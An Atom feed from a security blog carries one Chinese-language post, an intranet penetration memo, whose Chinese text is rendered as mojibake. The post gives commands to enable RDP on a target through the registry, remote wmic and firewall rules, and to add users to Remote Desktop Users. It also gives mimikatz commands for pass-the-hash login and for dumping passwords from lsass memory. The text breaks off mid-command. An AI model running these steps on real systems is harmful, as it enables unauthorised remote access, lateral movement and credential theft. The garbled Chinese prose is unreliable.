<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0nk3y&#39;s Blog @ D0g3</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2021-06-24T03:17:51.985Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å†…ç½‘æ¸—é€å¤‡å¿˜å½•</title>
    <link href="https://hack-for.fun/d789.html"/>
    <id>https://hack-for.fun/d789.html</id>
    <published>2021-06-21T03:06:28.000Z</published>
    <updated>2021-06-24T03:17:51.985Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210624111457.png"></p><p>æ¬¢è¿å…³æ³¨å…¬ä¼—å·ï¼Œä»¥ååšå®¢ä¸æ›´æ–°äº†ï¼Œæ–‡ç« éƒ½åœ¨å…¬ä¼—å·å‘ã€‚</p><h1 id="ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP"><a href="#ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP" class="headerlink" title="ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP"></a>ä¸åŒç‰ˆæœ¬Windowså¼€å¯RDP</h1><p>å¯ä»¥è¿æ¥åˆ°è¿è¡Œä»¥ä¸‹ Windows æ“ä½œç³»ç»Ÿçš„ç”µè„‘ï¼š</p><ul><li>Windows 10 ä¸“ä¸šç‰ˆ</li><li>Windows 10 ä¼ä¸šç‰ˆ</li><li>Windows 8 ä¼ä¸šç‰ˆ</li><li>Windows 8 ä¸“ä¸šç‰ˆ</li><li>Windows 7 ä¸“ä¸šç‰ˆ</li><li>Windows 7 ä¼ä¸šç‰ˆ</li><li>Windows 7 æ——èˆ°ç‰ˆ</li><li>Windows 7 æ——èˆ°ç‰ˆ</li><li><strong>Windows 2008 Server</strong></li><li><strong>Windows Server 2008 R2</strong></li><li><strong>Windows Server 2012</strong></li><li><strong>Windows Server 2012 R2</strong></li><li><strong>Windows Server 2016</strong></li><li>Windows Multipoint Server 2011</li><li>Windows Multipoint Server 2012</li><li>Windows Small Business Server 2008</li><li>Windows Small Business Server 2011</li></ul><p>ä»¥ä¸‹è®¡ç®—æœºå¯ä»¥è¿è¡Œè¿œç¨‹æ¡Œé¢ç½‘å…³ï¼š</p><ul><li>Windows 2008 Server</li><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Small Business Server 2011</li></ul><p>ä»¥ä¸‹æ“ä½œç³»ç»Ÿå¯ç”¨ä½œ RD Web è®¿é—®æˆ– RemoteApp æœåŠ¡å™¨ï¼š</p><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li></ul><p>è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯ä¸ä¼šè¿æ¥åˆ°ä»¥ä¸‹ Windows ç‰ˆæœ¬ï¼š</p><ul><li>Windows 7 ç®€æ˜“ç‰ˆ</li><li>Windows 7 å®¶åº­ç‰ˆ</li><li>Windows 8 å®¶åº­ç‰ˆ</li><li>Windows 8.1 å®¶åº­ç‰ˆ</li><li>Windows 10 å®¶åº­ç‰ˆ</li></ul><h2 id="åˆ¤æ–­æ˜¯å¦å¼€å¯RDP"><a href="#åˆ¤æ–­æ˜¯å¦å¼€å¯RDP" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å¼€å¯RDP"></a>åˆ¤æ–­æ˜¯å¦å¼€å¯RDP</h2><p><em>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWindow XPå’Œ server 2003ä¸Šçš„è¿œç¨‹æ¡Œé¢æœªå¯ç”¨</em> ï¼Œé€šè¿‡ä¸‹é¢çš„æ³¨å†Œè¡¨æŸ¥è¯¢å¯ä»¥çŸ¥é“ç›®æ ‡æœºå™¨æ˜¯å¦å¼€å¯äº†RDPæœåŠ¡</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections </span><br><span class="line"># æŸ¥çœ‹RDPæœåŠ¡æ˜¯å¦å¼€å¯ï¼š1å…³é—­ï¼Œ0å¼€å¯ </span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹RDPæœåŠ¡çš„ç«¯å£</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113523181.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621113556564.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114128380.png)</p><p>16è¿›åˆ¶ d3d å°±æ˜¯ 10è¿›åˆ¶çš„ 3389</p><p>æ–¹æ³•äºŒï¼Œé€šè¿‡æŸ¥çœ‹è¿›ç¨‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;svc | find &quot;TermService&quot; # æ‰¾åˆ°å¯¹åº”æœåŠ¡è¿›ç¨‹çš„PID</span><br><span class="line">netstat -ano | find &quot;844&quot; # æ‰¾åˆ°è¿›ç¨‹å¯¹åº”çš„ç«¯å£å·</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621114506770.png)</p><h2 id="é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP"><a href="#é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP" class="headerlink" title="é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP"></a>é€šè¿‡æ³¨å†Œè¡¨å¼€å¯RDP</h2><h3 id="regæ–‡ä»¶"><a href="#regæ–‡ä»¶" class="headerlink" title="regæ–‡ä»¶"></a>regæ–‡ä»¶</h3><p>ç¬¬ä¸€ç§æ–¹æ³•ä¹Ÿæ˜¯ç”¨â€echoâ€å‘½ä»¤å†™å…¥ä¸€ä¸ª 3389.regæ–‡ä»¶ï¼Œå†â€regedit /s 3389.regâ€å¯¼å…¥æ³¨å†Œè¡¨æ–‡ä»¶å³å¯å¼€å¯ï¼Œæ¯”è¾ƒç®€å•ã€‚å°†å¦‚ä¸‹ä»£ç ä¸€è¡Œä¸€è¡Œåœ°å¤åˆ¶åˆ°cmdshellçª—å£åæŒ‰å›è½¦æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;3389.reg</span><br><span class="line">echo. &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;fDenyTSConnections&quot;&#x3D;dword:00000000 &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsdpwdTds cp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp] &gt;&gt;3389.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000d3d &gt;&gt;3389.reg</span><br></pre></td></tr></table></figure><p>å®Œæˆä»¥ä¸Šæ“ä½œåå†æ‰§è¡Œâ€regedit /s 3389.regâ€å¯¼å…¥æ³¨å†Œè¡¨å³å¯ç”Ÿæ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç‰ˆæœ¬Windows 10 ä¸“ä¸šç‰ˆ</span><br><span class="line">ç‰ˆæœ¬å·21H1</span><br><span class="line">å®‰è£…æ—¥æœŸ2021&#x2F;6&#x2F;19</span><br><span class="line">æ“ä½œç³»ç»Ÿå†…éƒ¨ç‰ˆæœ¬19043.928</span><br><span class="line">ä½“éªŒWindows Feature Experience Pack 120.2212.551.0</span><br></pre></td></tr></table></figure><p>å‡ºç°äº†UAC</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621115651613.png)</p><h3 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621120045039.png)</p><p>å› æ­¤ï¼Œè¦æƒ³å¼€å¯RDPï¼Œé¦–å…ˆæ˜¯è·å¾—äº†ç³»ç»Ÿçš„ç®¡ç†å‘˜æƒé™ã€‚</p><p><strong>æ³¨ï¼š</strong></p><p>å¦‚æœä¿®æ”¹è¿æ¥ç«¯å£ï¼Œ<strong>ç³»ç»Ÿé‡å¯åæ‰èƒ½ç”Ÿæ•ˆ</strong></p><p><strong>è¡¥å……</strong></p><p><strong>å¦‚æœç³»ç»Ÿæœªé…ç½®è¿‡è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼Œç¬¬ä¸€æ¬¡å¼€å¯æ—¶è¿˜éœ€è¦æ·»åŠ é˜²ç«å¢™è§„åˆ™å…è®¸3389ç«¯å£</strong></p><p>ä¿®æ”¹é˜²ç«å¢™é…ç½®ï¼Œå…è®¸3389ç«¯å£çš„å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡wmicå¼€å¯RDP"><a href="#é€šè¿‡wmicå¼€å¯RDP" class="headerlink" title="é€šè¿‡wmicå¼€å¯RDP"></a>é€šè¿‡wmicå¼€å¯RDP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node: &quot;192.168.1.160&quot; &#x2F;USER:&quot;192.168.1.160\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1 # éœ€è¦è¾“å…¥è¿œç¨‹æœºå™¨ä¸Šç®¡ç†å‘˜å¯†ç </span><br></pre></td></tr></table></figure><h2 id="æ·»åŠ ç”¨æˆ·åˆ°Remote-Desktop-Usersç»„"><a href="#æ·»åŠ ç”¨æˆ·åˆ°Remote-Desktop-Usersç»„" class="headerlink" title="æ·»åŠ ç”¨æˆ·åˆ°Remote Desktop Usersç»„"></a>æ·»åŠ ç”¨æˆ·åˆ°Remote Desktop Usersç»„</h2><p>æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰å·¥ä½œç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹Administratorç»„å†…çš„ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹Remote Desktop Usersç»„å†…çš„ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot;</span><br></pre></td></tr></table></figure><p>èµ‹äºˆéadministratorç»„ç”¨æˆ·è¿œç¨‹æ¡Œé¢ç™»å½•æƒé™ï¼Œä¹Ÿå³æŠŠç›®æ ‡ç”¨æˆ·åŠ å…¥Remote Desktop Usersç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;add </span><br></pre></td></tr></table></figure><p>æ­¤åusernameå…·æœ‰è¿œç¨‹ç™»å½•çš„æƒé™ï¼Œç™»å½•å®Œæˆåå°†usernameåœ¨Remote Desktop Usersç»„ä¸­åˆ é™¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username &#x2F;del</span><br></pre></td></tr></table></figure><h2 id="RDPç™»å½•"><a href="#RDPç™»å½•" class="headerlink" title="RDPç™»å½•"></a>RDPç™»å½•</h2><h3 id="Windows-æ˜æ–‡ç™»å½•"><a href="#Windows-æ˜æ–‡ç™»å½•" class="headerlink" title="Windows æ˜æ–‡ç™»å½•"></a>Windows æ˜æ–‡ç™»å½•</h3><ol><li>mstsc.exe</li><li>mstsc.exe /console /v:ip/admin   # å¦‚æœç™»å½•ç”¨æˆ·æ•°é‡è¾¾åˆ°é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤å¼ºåˆ¶è¸¢å‡ºä¸€ä¸ªç”¨æˆ·</li></ol><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621195256529.png)</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200056069.png)</p><p>è¢«è¸¢ä¸‹çº¿</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621200125104.png)</p><h3 id="Windows-ä½¿ç”¨-Hash-ç™»å½•"><a href="#Windows-ä½¿ç”¨-Hash-ç™»å½•" class="headerlink" title="Windows ä½¿ç”¨ Hash ç™»å½•"></a>Windows ä½¿ç”¨ Hash ç™»å½•</h3><h4 id="mstsc"><a href="#mstsc" class="headerlink" title="mstsc"></a>mstsc</h4><p>Serveréœ€è¦å¼€å¯ <strong>Restricted Admin modeï¼Œåœ¨Windows 8.1å’ŒWindows Server 2012 R2ä¸­é»˜è®¤å¼€å¯ï¼ŒåŒæ—¶å¦‚æœWin 7 å’ŒWindows Server 2008 R2å®‰è£…äº†2871997ã€2973351è¡¥ä¸ä¹Ÿæ”¯æŒï¼›Clientéœ€è¦æ”¯æŒ Restricted Admin mode</strong>ï¼Œå½“å‰ç³»ç»Ÿä¸æ”¯æŒï¼Œé“¾æ¥æ—¶å°†å‡ºç°å¦‚ä¸‹ï¼š</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202739352.png)</p><p>å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¼€å¯ Restricted Admin mode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦å·²ç»å¼€å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br></pre></td></tr></table></figure><p>å¼€å¯åä½¿ç”¨ï¼šmstsc.exe /restrictedadmin è¿›è¡Œç™»å½•ä¸éœ€è¦å¯†ç ï¼Œå°†ä½¿ç”¨å½“å‰ç”¨æˆ·çš„hashè¿›è¡ŒéªŒè¯</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202945033.png)</p><p>è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶å°±æ˜¯æœ¬åœ°æœ‰rdpçš„å‡­æ®ï¼Œä¸ç„¶å°±ä¼šä¸‹é¢è¿™æ ·</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621203044329.png)</p><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><ol><li>mimikatz.exe # éœ€è¦ç®¡ç†å‘˜æƒé™</li><li>privilege::debug</li><li>sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d â€œ/run:mstsc.exe /restrictedadminâ€</li></ol><h4 id="mimikatz-æŠ“å–hash"><a href="#mimikatz-æŠ“å–hash" class="headerlink" title="mimikatz æŠ“å–hash"></a>mimikatz æŠ“å–hash</h4><p>åœ¨Windows2000ä»¥åï¼ŒWindowsæœºå™¨éƒ½ç”¨NTLMç®—æ³•åœ¨æœ¬åœ°ä¿å­˜ç”¨æˆ·çš„å¯†ç ï¼Œå¯†ç çš„NTLMå“ˆå¸Œä¿å­˜åœ¨<code>%SystemRoot%\System32\config\SAM</code>æ–‡ä»¶ä¸­ã€‚ Windowsæ“ä½œç³»ç»Ÿé€šå¸¸ä½¿ç”¨ä¸¤ç§æ–¹æ³•å¯¹ç”¨æˆ·çš„å¯†ç è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œå³ LAN Managerï¼ˆLMï¼‰å“ˆå¸Œå’Œ NT LAN Managerï¼ˆNTLMï¼‰å“ˆå¸Œã€‚æ‰€è°“å“ˆå¸Œï¼ˆHashï¼‰ï¼Œå³ä½¿ç”¨ä¸€ç§åŠ å¯†æ–¹æ³•å¯¹æ˜æ–‡å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œå¯¹ä¸€ä¸ªä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²æ•°æ®è¿›è¡Œä¸€æ¬¡åŠ å¯†è¿ç®—ï¼Œéƒ½å¯ä»¥è¿”å›ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²ã€‚WindowsåŠ å¯†è¿‡çš„å¯†ç å£ä»¤ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºHashã€‚</p><p>Windowsæ“ä½œç³»ç»Ÿä¸­çš„å¯†ç ä¸€èˆ¬ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šä¸€éƒ¨åˆ†ä¸ºLM Hashï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºNTLM Hashã€‚åœ¨Windowsä¸­ï¼ŒHashçš„ç»“æ„é€šå¸¸å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username:RID:LM-Hash:NT-Hash</span><br></pre></td></tr></table></figure><p>åœ¨windows2000ä»¥åçš„ç³»ç»Ÿä¸­ï¼Œç¬¬ä¸€éƒ¨åˆ†çš„ LM-hash éƒ½æ˜¯ç©ºå€¼ï¼Œå› ä¸ºLM-hashå¯ä»¥å¾ˆå®¹æ˜“çš„ç ´è§£ï¼Œæ‰€ä»¥windows2000ä¹‹åè¿™ä¸ªå€¼é»˜è®¤ä¸ºç©ºï¼Œæ‰€ä»¥ç¬¬äºŒéƒ¨åˆ†çš„NTLM-hashæ‰çœŸæ­£æ˜¯ç”¨æˆ·å¯†ç çš„å“ˆå¸Œå€¼ã€‚</p><p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œé€šå¸¸å¯<strong>ä»Windowsç³»ç»Ÿä¸­çš„SAMæ–‡ä»¶å’ŒåŸŸæ§çš„NTDS.ditæ–‡ä»¶ï¼ˆåœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ä¿¡æ¯å­˜å‚¨åœ¨NTDS.ditä¸­ï¼‰ä¸­è·å¾—æ‰€æœ‰ç”¨æˆ·çš„Hashã€‚ä¹Ÿå¯ä»¥é€šè¿‡Mimikatzè¯»å–lsass.exeè¿›ç¨‹è·å¾—å·²ç™»å½•ç”¨æˆ·çš„NTLM hashå’Œæ˜æ–‡å€¼ ã€‚</strong></p><blockquote><p>æ³¨ï¼šä½†æ˜¯åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwin10æˆ–windows server 2012æ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ã€‚</p></blockquote><p>Mimikatzè¯»å–æ˜æ–‡å¯†ç å’Œhashä¹Ÿæ—¶æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug      &#x2F;&#x2F; æå‡è‡³debugæƒé™</span><br><span class="line">sekurlsa::logonpasswords       &#x2F;&#x2F; æŠ“å–å¯†ç </span><br></pre></td></tr></table></figure><h3 id="Linuxæ˜æ–‡ç™»å½•"><a href="#Linuxæ˜æ–‡ç™»å½•" class="headerlink" title="Linuxæ˜æ–‡ç™»å½•"></a>Linuxæ˜æ–‡ç™»å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop ip:port</span><br></pre></td></tr></table></figure><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621201013729.png)</p><hr><p>ä¸Šé¢å…¶å®ç®€å•æ¥è¯´éƒ½æ˜¯é’ˆå¯¹æ”¯æŒRDPçš„Windows server æ“ä½œç³»ç»Ÿçš„ã€‚è¿˜æœ‰Windows 7ã€8è¿™äº› æ²¡æœ‰serverçš„ã€‚rdpæœåŠ¡å¦‚ä½•å¼€å¯ï¼Ÿ</p><h2 id="Windows-Server-03"><a href="#Windows-Server-03" class="headerlink" title="Windows Server 03"></a>Windows Server 03</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å¼€å¯ï¼š</span><br><span class="line">REG ADD \<span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">å…³é—­ï¼š</span></span><br><span class="line"><span class="string">REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span></span><br><span class="line"><span class="string">å¼€å¯ï¼š</span></span><br><span class="line"><span class="string">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span></span><br><span class="line"><span class="string">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;</span> <span class="string">&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">REG ADD &quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="string">&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h2 id="Windows-Xp"><a href="#Windows-Xp" class="headerlink" title="Windows Xp"></a>Windows Xp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h2 id="Windows-8"><a href="#Windows-8" class="headerlink" title="Windows 8"></a>Windows 8</h2><p>ä¸‰æ¡å‘½ä»¤å³å¯ï¼š</p><ol><li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != â€œâ€) call setallowtsconnections 1</li><li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =â€™RDP-Tcpâ€™) call setuserauthenticationrequired 1</li><li>reg add â€œHKLM\SYSTEM\CurrentControlSet\Control\Terminal Serverâ€ /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</li></ol><p>æˆ–è€…reg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="Windows-2012"><a href="#Windows-2012" class="headerlink" title="Windows 2012"></a>Windows 2012</h2><p>é€šç”¨</p><h2 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h2><ol><li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != â€œâ€) call setallowtsconnections 1</li><li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =â€™RDP-Tcpâ€™) call setuserauthenticationrequired 1</li></ol><p>ä»¥ä¸Šå‰ææ¡ä»¶æ˜¯ç¡®ä¿Windows Management Instrumentationï¼ˆWinmgmtï¼‰æœåŠ¡å·²æ­£å¸¸å¯åŠ¨ï¼Œæƒé™ä¸ºç®¡ç†å‘˜æƒé™ã€‚</p><h2 id="Windows-2016"><a href="#Windows-2016" class="headerlink" title="Windows 2016"></a>Windows 2016</h2><p>Server 2016 é»˜è®¤è¿œç¨‹æ¡Œé¢è¿æ¥æ•°æ˜¯ 2 ä¸ªç”¨æˆ·ï¼Œå¦‚æœå¤šä½™ä¸¤ä¸ªç”¨æˆ·è¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæç¤ºè¶…è¿‡è¿æ¥æ•°</p><p>ä½¿ç”¨powershell,</p><p>è®¾ç½® fDenyTSConnections ä¸º0ï¼Œå…è®¸Terminal Servicesã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal Server&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;fDenyTSConnections&#x27;</span> <span class="literal">-Value</span> <span class="number">0</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>å¼€å¯ç”¨æˆ·éªŒè¯ï¼Œæ¨èé»˜è®¤å¼€å¯ï¼Œä½†æ˜¯ä½œä¸ºæ¸—é€æµ‹è¯•çš„è¯ï¼Œåº”è¯¥æ˜¯å¯ä»¥ä¸ç”¨çš„</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;UserAuthentication&#x27;</span> <span class="literal">-Value</span> <span class="number">1</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ é˜²ç«å¢™è§„åˆ™</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enable-NetFirewallRule</span> <span class="literal">-DisplayGroup</span> <span class="string">&#x27;Remote Desktop&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enable Remote Desktop</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> Win32_TerminalServiceSetting <span class="literal">-Namespace</span> 